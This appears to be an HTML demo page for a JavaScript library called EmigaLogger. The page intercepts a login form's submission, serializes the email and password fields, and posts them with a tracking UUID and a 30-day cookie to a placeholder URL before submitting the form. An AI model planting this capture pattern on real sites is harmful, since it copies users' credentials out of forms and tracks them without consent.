<!DOCTYPE html>
<html>
<head>
	<title>Form logger by EmigaLogger</title>
</head>
<body>

<form action="https://example.com" method="post" accept-charset="utf-8">
	<input type="text" name="email" placeholder="email" />
	<input type="text" name="password" placeholder="password" />
	<input type="submit" name="submit" value="submit">
</form>

<script type="text/javascript" src="../dist/EmigaLogger.min.js"></script>
<script type="text/javascript">
	(new EmigaInit((e)=> {
		const Data  = (new EmigaData());
		const Token = (new EmigaCookies()).Get('X-UUID') || (new EmigaToken()).uuid();

		const Form  = (new EmigaSelector()).Select('form');
		(new EmigaLogger()).Log(Form,'submit',(e)=>{
			e.preventDefault();
			Data.Send('https://example.com',{
				method: 'POST',
				headers: {
					'X-UUID': Token
				},
				body: JSON.stringify({
					uuid   : Token,
					data   : Data.Serialize(Form),
					cookie : (new EmigaCookies()).Cookie('X-UUID',(new EmigaToken()).uuid(),30)
				})
			});
			e.stopPropagation();
			(new EmigaSelector()).Submit(Form);
		});
	}));
</script>
</body>
</html>